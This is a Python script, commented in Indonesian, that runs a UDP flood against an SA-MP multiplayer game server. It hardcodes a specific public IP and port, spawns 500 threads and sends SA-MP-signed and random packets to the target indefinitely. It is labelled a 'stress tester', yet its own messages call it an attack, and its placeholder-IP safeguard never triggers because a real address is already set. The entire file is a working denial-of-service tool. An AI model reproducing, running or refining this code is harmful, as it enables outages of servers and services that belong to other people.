import socket
import threading
import time
import random
import struct
import sys
import os

# ===== KONFIGURASI DEWA =====
TARGET_IP = "43.134.9.46"  # GANTI INI!
TARGET_PORT = 7000
THREADS = 500  # Threads maksimal untuk HP
DURATION = 0  # 0 = unlimited, detik

# Packet SA-MP signature
SAMP_SIGNATURE = b'SAMP'

class SAMP_GOD_ATTACK:
    def __init__(self):
        self.attack_count = 0
        self.running = True
        self.start_time = time.time()
        
    def generate_samp_packet(self):
        """Generate SA-MP protocol packets"""
        # SA-MP packet structure
        version = random.randint(0, 1000)
        opcode = random.choice([b'\x00', b'\x01', b'\x02', b'\x03', b'\x04'])
        
        # Build legit-looking SA-MP packet
        packet = SAMP_SIGNATURE
        packet += struct.pack('>I', version)  # Server token
        packet += opcode  # Packet ID
        packet += os.urandom(512)  # Random data
        return packet
    
    def udp_flood(self):
        """UDP flood attack optimized for mobile"""
        while self.running:
            try:
                # Multiple socket types
                sock_type = random.choice([socket.SOCK_DGRAM, socket.SOCK_RAW])
                sock = socket.socket(socket.AF_INET, sock_type)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Set timeout untuk performa HP
                sock.settimeout(0.001)
                
                # Generate multiple packets per connection
                for _ in range(random.randint(5, 20)):
                    packet = self.generate_samp_packet()
                    sock.sendto(packet, (TARGET_IP, TARGET_PORT))
                    self.attack_count += 1
                    
                    # Tambahkan packet dummy
                    sock.sendto(os.urandom(1024), (TARGET_IP, TARGET_PORT))
                    self.attack_count += 1
                
                sock.close()
                
                # Progress report
                if self.attack_count % 100 == 0:
                    elapsed = time.time() - self.start_time
                    print(f"[GOD-MODE] Packets: {self.attack_count} | Speed: {self.attack_count/elapsed:.1f}pkt/s")
                    
            except Exception as e:
                # Continue bahkan jika error
                pass
    
    def start(self):
        print(f"""
╔═══════════════════════════════════════╗
║    SA-MP GOD MODE STRESS TESTER      ║
║    Target: {TARGET_IP}:{TARGET_PORT}
║    Threads: {THREADS} | Mobile Optimized
╚═══════════════════════════════════════╝
        """)
        
        # Warning
        if TARGET_IP == "IP_SERVER_SENDIRI_SAJA":
            print("[ERROR] Ganti TARGET_IP dengan server pribadi Anda!")
            return
        
        print("[*] Starting GOD-MODE attack...")
        
        # Start threads
        threads = []
        for i in range(THREADS):
            t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        print(f"[+] {THREADS} threads activated!")
        print("[+] Attack running... Press Ctrl+C to stop")
        
        # Duration control
        try:
            if DURATION > 0:
                time.sleep(DURATION)
                self.running = False
            else:
                while True:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        
        # Statistics
        total_time = time.time() - self.start_time
        print(f"""
╔═══════════════════════════════════════╗
║           ATTACK FINISHED            ║
╠═══════════════════════════════════════╣
║ Total Packets: {self.attack_count:>15} ║
║ Duration: {total_time:>20.1f}s ║
║ Packets/Second: {(self.attack_count/total_time):>13.1f} ║
╚═══════════════════════════════════════╝
        """)
